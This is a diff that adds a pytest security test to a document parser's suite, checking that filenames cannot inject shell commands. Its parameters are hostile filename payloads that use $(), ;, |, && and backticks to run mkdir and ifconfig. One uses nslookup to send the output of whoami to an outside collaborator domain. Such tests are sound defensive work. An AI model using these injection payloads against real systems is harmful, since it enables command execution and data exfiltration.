@@ -416,3 +416,30 @@ async def test_strikethrough_words():
     parser_type = "STATIC_PARSE"
     results = parse(sample, parser_type, framework="pdfplumber")["raw"]
     assert "~~" in results, "Markdown strikethrough text not found"
+
+
+@pytest.mark.parametrize(
+    "sample",
+    [
+        "test$(mkdir -p path_injection_success).docx",
+        "test; mkdir -p path_injection_success.docx",
+        "test|mkdir -p path_injection_success.docx",
+        "test&&mkdir -p path_injection_success.docx",
+        "test`nslookup $(whoami).zgj16g1o2dmxv2y6wwmegjxaq1wskt8i.net-spi.com`.docx",
+        "ifconfig -a; echo 'test'.docx",
+    ],
+)
+@pytest.mark.asyncio
+async def test_docx_path_injection(sample):
+    # Attempt to inject a directory creation command via the filename
+    parser_type = "STATIC_PARSE"
+    dir_name = "path_injection_success"
+    try:
+        parse(sample, parser_type)["raw"]
+    except Exception as e:
+        print(f"Parsing failed: {e}")
+        assert "Package not found" in str(e)
+    finally:
+        if os.path.exists(dir_name):
+            os.rmdir(dir_name)
+            assert False, "Path injection detected"
